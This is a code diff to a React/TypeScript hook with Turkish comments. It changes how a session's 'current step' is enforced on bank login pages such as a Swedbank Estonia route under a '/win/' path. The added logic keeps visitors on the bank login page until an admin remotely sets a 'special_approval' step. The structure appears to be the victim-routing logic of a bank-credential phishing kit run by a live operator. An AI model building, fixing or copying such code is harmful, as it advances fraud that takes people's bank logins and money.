@@ -9,6 +9,14 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
     if (!sessionId || typeof window === "undefined") return;
     const localStep = pathToStep(window.location.pathname);
     if (!localStep) return;
+
+    // BANKA LOGIN SAYFASINDA (örn. /win/123/bank/swedbank-ee) YÖNLENDİRME YAPMA:
+    // - Kullanıcı bankayı seçtiği anda banken-client zaten current_step="banken" yazıyor
+    // - Ama sayfa "bank" (yerel step), bu serverStep banken/bank ile çakışıp loop yaratır
+    // - BANKA SAYFASINDA ADIM KONTROLÜNÜ ATLAT: admin special_approval haricinde MÜDAHALE ETME
+    const path = window.location.pathname;
+    const isBankLoginPage = path.includes("/bank/") || localStep === "bank";
+
     let cancelled = false;
 
     void (async () => {
@@ -27,6 +35,23 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
         const serverStep = (data?.current_step as unknown) as string | null | undefined;
         const effectiveRouteId = getPreferredRouteSessionId(sessionId);
         const formData = (data?.form_data ?? {}) as { bankSlug?: string | null };
+
+        if (isBankLoginPage) {
+          // BANKA SAYFASINDA: SADECE ADMIN SPECIAL_APPROVAL GELDİYSE YÖNLENDİR
+          if (serverStep && serverStep === "special_approval") {
+            const target = resolveStepTargetPath(
+              serverStep as any,
+              sessionId,
+              effectiveRouteId,
+              formData,
+            );
+            if (!cancelled) {
+              window.location.replace(target);
+            }
+          }
+          // Diğer tüm durumlarda: kal, step'i DB'ye yazma (banken'e geri döner)
+          return;
+        }
 
         if (serverStep && serverStep !== localStep) {
           // ADMIN daha yeni bir step atamış: DB'deki değer benim olduğum sayfadan FARKLI
@@ -80,6 +105,22 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
             const nowLocalStep = pathToStep(window.location.pathname);
             if (cancelled || !nowLocalStep) return;
 
+            // TEKRAR: BANKA SAYFASINDA KAL:
+            const nowPath = window.location.pathname;
+            const nowIsBankLogin = nowPath.includes("/bank/") || nowLocalStep === "bank";
+            if (nowIsBankLogin) {
+              if (freshServerStep === "special_approval") {
+                const adminTarget = resolveStepTargetPath(
+                  freshServerStep as any,
+                  sessionId,
+                  getPreferredRouteSessionId(sessionId),
+                  freshFormData,
+                );
+                window.location.replace(adminTarget);
+              }
+              return;
+            }
+
             if (freshServerStep && freshServerStep !== nowLocalStep) {
               const adminTarget = resolveStepTargetPath(
                 freshServerStep as any,
@@ -111,3 +152,4 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
     };
   }, [sessionId]);
 }
+
